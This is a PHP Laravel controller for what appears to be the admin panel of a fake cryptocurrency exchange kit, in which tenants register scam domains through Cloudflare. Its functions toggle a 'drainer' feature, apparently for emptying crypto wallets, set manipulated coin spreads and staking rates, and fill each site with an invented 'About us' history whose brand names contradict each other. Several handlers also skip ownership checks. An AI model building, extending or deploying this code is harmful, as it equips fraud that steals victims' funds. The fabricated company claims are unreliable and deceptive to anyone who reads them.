<?php

namespace App\Http\Controllers;

use App\Classes\CourseFunction;
use App\Classes\PaymentFunction;
use App\Models\Coin;
use App\Models\Domain;
use Illuminate\Http\Request;
use App\Classes\CloudflareFunction;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Validator;


class DomainController extends Controller
{
    public function index()
    {
        $domains = Domain::where('user_id', auth()->user()->id)->get();
        $coins = Coin::all();
        $coinsPayment = Coin::where("payment_active", "1")->get();
        return view('admin.domains', ['domains' => $domains, 'coins' => $coins, 'coinsPayment' => $coinsPayment]);
    }

    public function get($id)
    {
        $domain = Domain::where('id', $id)->where("user_id", Auth::user()->id)->first()->toArray();
        return response()->json($domain, 201);
    }

    public function indexAdd()
    {

        return view('admin.domain_add');
    }

    public function updateData(Request $request)
    {
        $user = $request->user();
        if ($user->users_status != "admin") {
            $domain = Domain::where('id', $request->id)->where("user_id", $user->id)->first();
        } else {
            $domain = Domain::where('id', $request->id)->first();
        }

        if (!$domain) return response()->json(['message' => 'Домен не найден'], 401);

        if ($request->hasFile('about_img1')) {
            $img_1 = $request->file('about_img1');
            $img_1_name = time() . '_1.' . $img_1->extension();
            $img_1->move(public_path('images/users/about'), $img_1_name);
            $domain->about_img1 = 'images/users/about/' . $img_1_name;
        }

        if ($request->hasFile('about_img2')) {
            $img_2 = $request->file('about_img2');
            $img_2_name = time() . '_2.' . $img_2->extension();
            $img_2->move(public_path('images/users/about'), $img_2_name);
            $domain->about_img2 = 'images/users/about/' . $img_2_name;
        }

        $drainer = $request->drainer == "enable" ? 1 : 0;
        $domain->title = $request->title;
        $domain->drainer = $drainer;
        $domain->about_text1 = $request->about_text1;
        $domain->about_text2 = $request->about_text2;
        $domain->faq = $request->faq;
        $domain->save();

        return response()->json(['message' => 'Данные успешно обновлены'], 201);
    }
    public function test()
    {
        $CourseFunction = new CourseFunction();
        $coins = Coin::all();
        $data = [];
        foreach ($coins as $coin) {
            try {

                $data[] = [$coin["full_name"] => $CourseFunction->getCoinPrice($coin["full_name"])];
            } catch (\Exception $e) {
                $data[] = [$coin["full_name"] => ""];
            }
        }

        return json_encode($data);
    }

    public function create(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'domain' => 'required|unique:domains,domain',
            'stmp_host' => 'required',
            'stmp_email' => 'required',
            'stmp_password' => 'required',
            'title' => 'required',
//            'logo' => 'required|image|mimes:jpeg,png,jpg,gif|max:2048',

        ]);
        if ($validator->fails()) {
            return response()->json(['errors' => $validator->errors()], 401);
        }
//        $image = $request->file('logo');
//        $imageName = time() . '.' . $image->extension();
//        $image->move(public_path('images/users/logos'), $imageName);
//        $relativePath = 'images/users/logos/' . $imageName;


        $cloudflareFunction = new CloudflareFunction();
        try {
            $data = $cloudflareFunction->add_domain_cloudflare($request->domain);
        } catch (\Exception $exception) {
            try {
                $zone_id = $cloudflareFunction->get_zoneid($request->domain);
                $ns_list = $cloudflareFunction->get_ns_list($request->domain);
                $data = ["zone_id" => $zone_id, "ns_list" => $ns_list];
            } catch (\Exception $e) {
                return response()->json(['message' => 'Ошибка при добавлении домена. Возможно этот домен уже привязан к Cloudflare.'], 401);
            }
        }
        $zone_id = $data["zone_id"];
        $ns_list = $data["ns_list"];

        $html = '<main class="about">
    <section class="about-us">
        <div class="container">
            <div class="about-us-content">
                <h2 class="h2_40 pb40">About us</h2>
                <div class="about-grid">
                    <div class="about-block">
                        <img
                            class="about_img pb30"
                            src="/images/about-us_1.png"
                            alt=""
                        />
                        <p class="text_18 _140">
                            Our company begins its history from June 2018, when it was
                            developed. Recognizing the importance of Bitcoin from the
                            onset, and understanding that the exchange is the most
                            critical part of the cryptocurrency ecosystem, Jayson Raymond
                            founded Cryptohouse to give people the means to quickly and
                            securely invest in the space. Since then, the company has
                            grown by leaps and bounds with hundreds of employees spanning
                            the globe.
                        </p>
                    </div>
                    <div class="about-block">
                        <p class="text_18 _140 pb30">
                            We’re a diverse group of thinkers and doers that are dedicated
                            to making cryptocurrency available and accessible to the world
                            and enabling people from all walks of life to invest in their
                            independence. We believe that everyone should have the freedom
                            to earn, hold, spend, share and give their money - no matter
                            who you are or where you come from.
                        </p>
                        <img
                            class="about_img"
                            src="images/about-us_2.png"
                        />
                    </div>
                </div>
            </div>
        </div>
    </section>
    <section class="whatwedo">
        <div class="container">
            <div class="whatwedo-content">
                <h2 class="h2_40">What we do</h2>
                <div class="whatwedo-block">
                    <h2 class="h2_20 pb20">Empowering investors</h2>
                    <p class="text_18 _140 color-gray2">
                        Whether you’re an advanced trader or a crypto-beginner,
                        Cryptohouse gives you the power to chart your own financial
                        course. Our exchange has an ever-growing number of
                        cryptocurrency pairs for you to invest in and a slew of tools
                        and features for you to leverage as you grow your portfolio.
                    </p>
                </div>
                <div class="whatwedo-block">
                    <h2 class="h2_20 pb20">Supporting institutions</h2>
                    <p class="text_18 _140 color-gray2">
                        From over-the-counter trading to personalized white-glove
                        account management, Bitexwave is the premier cryptocurrency
                        investing solution for institutions of all sizes. We offer
                        exceptional liquidity and competitive pricing for all our
                        markets so you can achieve your investment goals quickly and
                        confidently.
                    </p>
                </div>
            </div>
        </div>
    </section>
    <section class="roadmap">
        <div class="container">
            <div class="roadmap-content">
                <h2 class="h2_40">Roadmap</h2>
                <div class="roadmap-grid">
                    <div class="roadmap-grid-block">
                        <div class="roadmap-block">
                            <h2 class="h2_20 color-gray2">2018 June</h2>
                            <div class="steps">
                                <span class="text_17">The Crypto Ark sets sail</span>
                                <span class="text_17">New UI and UX</span>
                            </div>
                        </div>
                        <div class="roadmap-block">
                            <h2 class="h2_20 color-gray2">2019 March</h2>
                            <div class="steps">
                    <span class="text_17"
                    >Achieved 15% of global BTC volume</span
                    >
                                <span class="text_17"
                                >Rated TOP 15 Top Crypto Exchange in the World</span
                                >
                                <span class="text_17"
                                >4,000 participants joined our global trading
                      competition</span
                                >
                            </div>
                        </div>
                        <div class="roadmap-block">
                            <h2 class="h2_20 color-gray2">2020 February</h2>
                            <div class="steps">
                    <span class="text_17"
                    >Daily trading volume surpasses $2 billion</span
                    >
                                <span class="text_17"
                                >USDT has been added to the platform</span
                                >
                            </div>
                        </div>
                    </div>
                    <div class="roadmap-grid-block">
                        <div class="roadmap-block">
                            <h2 class="h2_20 color-gray2">2021 May</h2>
                            <div class="steps">
                                <span class="text_17">Launched Spot trading platform</span>
                                <span class="text_17">Added BEP20 network</span>
                                <span class="text_17">Added TRC20 network</span>
                                <span class="text_17"
                                >Hit an ATH trading volume of $35 billion</span
                                >
                            </div>
                        </div>
                        <div class="roadmap-block">
                            <h2 class="h2_20 color-gray2">2022 August</h2>
                            <div class="steps">
                    <span class="text_17"
                    >Became the Principal Team Partner of Oracle Red Bull
                      Racing</span
                    >
                                <span class="text_17">Enhanced account security</span>
                                <span class="text_17">Simplified login process</span>
                                <span class="text_17">Scalable trading engine</span>
                                <span class="text_17">Faster and automated withdrawals</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
</main>';
        $domain = new Domain();
        $domain->domain = $request->domain;
        $domain->stmp_host = $request->stmp_host;
        $domain->stmp_email = $request->stmp_email;
        $domain->stmp_password = $request->stmp_password;
        $domain->ns = json_encode($ns_list);
        $domain->title = $request->title;
        $domain->faq = $html;
//        $domain->logo = $relativePath;
        $domain->user_id = $request->user()->id;
        $domain->zone_id = $zone_id;

        if (!$domain->save()) {
            return response()->json(['message' => 'Ошибка при добавлении домена. Возможно этот домен уже привязан к Cloudflare'], 401);
        }
        return response()->json(['message' => 'Домен успешно добавлен. Теперь привяжите NS-записи к домену', 'ns_list' => $ns_list], 201);
    }

    public function updateStatusCloudflare($id)
    {
        $cloudflareFunction = new CloudflareFunction();
        $domain = Domain::where('id', $id)->first();
        $zone_id = $domain->zone_id;
        $status = $cloudflareFunction->check_domain_status_cloudflare($zone_id);
        $domain->status = $status;
        $domain->save();
        return response()->json(['status' => $status], 201);

    }

    public function delete($id)
    {
        $domain = Domain::where('id', $id)->first();
        $CloudflareFunction = new CloudflareFunction();
        $CloudflareFunction->delete_domain_cloudflare($domain['domain']);
        $domain->delete();
        return response()->json(['message' => 'Домен успешно удален'], 201);
    }

    public function createSpread(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'coin' => 'required|exists:coins,simple_name',
            'percent' => 'required|numeric',
        ]);
        if ($validator->fails()) {
            return response()->json(['errors' => $validator->errors()], 401);
        }
        $domain = Domain::where('id', $request->id)->first();
        $array = $domain->spread_coins !== "" ? json_decode($domain->spread_coins, true) : [];
        $array[$request->coin] = $request->percent;
        $domain->spread_coins = json_encode($array);
        $domain->save();
        return response()->json(['message' => 'Данные успешно обновлены', "data" => ["coin" => $request->coin, "percent" => $request->percent]], 201);
    }

    public function stackingSave(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'percent' => 'required|numeric',
            "days" => 'required|numeric',
        ]);
        if ($validator->fails()) {
            return response()->json(['errors' => $validator->errors()], 401);
        }

        $domain = Domain::where('id', $request->id)->first();
        $arr = $domain->stacking_percent !== "" ? json_decode($domain->stacking_percent, true) : [];
        $arr[$request->days] = $request->percent;
        $domain->stacking_percent = json_encode($arr);
        $domain->save();

        return response()->json(['message' => 'Данные успешно обновлены'], 201);
    }

    public function stackingGet(Request $request)
    {
        $domain = Domain::where('id', $request->id)->first();
        $stacking_percent = $domain->stacking_percent !== "" ? json_decode($domain->stacking_percent, true) : [];
        $percent = $stacking_percent[$request->days] ?? 0;
        return response()->json(['percent' => $percent], 201);
    }

}
